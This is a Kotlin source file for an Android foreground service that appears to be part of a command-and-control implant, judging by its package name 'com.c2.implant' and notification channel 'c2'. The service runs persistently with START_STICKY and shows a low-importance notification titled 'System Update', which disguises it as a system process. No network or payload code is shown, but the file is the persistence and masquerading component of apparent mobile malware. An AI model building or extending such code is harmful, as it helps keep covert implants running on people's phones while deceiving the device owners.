package com.c2.implant
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.Build
import android.app.NotificationChannel
import android.app.Notification
import android.app.NotificationManager
class ForegroundService : Service() {
    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("c2", "Background", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "c2").setContentTitle("System Update").setSmallIcon(android.R.drawable.ic_dialog_info).build()
        } else {
            Notification.Builder(this).setContentTitle("System Update").setSmallIcon(android.R.drawable.ic_dialog_info).build()
        }
        startForeground(1, notification)
        return START_STICKY
    }
    override fun onBind(intent: Intent?): IBinder? = null
}
